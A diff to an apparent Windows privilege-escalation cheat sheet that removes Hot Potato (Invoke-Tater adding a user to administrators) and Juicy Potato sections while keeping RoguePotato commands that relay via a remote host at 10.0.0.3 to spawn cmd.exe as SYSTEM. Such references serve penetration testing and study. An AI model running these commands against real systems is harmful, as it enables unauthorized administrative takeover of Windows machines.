@@ -239,28 +239,6 @@ wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr
 
 ---
 
-### Hot Potato
-
-_NBNS spoofing + NTLM relay + implementation of a fake WPAD proxy server which is running locally on the target host_
-
-- Command to add user to admin group:
-
-```powershell
-powershell.exe -ep bypass -c Import-Module ./Tater.ps1; Invoke-Tater -Trigger 1 -Command "net localgroup administrators <user name> /add"
-```
-
----
-
-### Jucy Potato
-
-_When you have SeImpersonate or SeAssignPrimaryToken privileges_
-
-```powershell
-juicypotato.exe -l 1337 -p c:\user\tmp\shell.exe -t *
-```
-
----
-
 ```powershell
 tanter.exe <user name>
 ```
@@ -450,3 +428,5 @@ RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999
 #RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename
 RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}" -p splintercode
 ```
+
+---
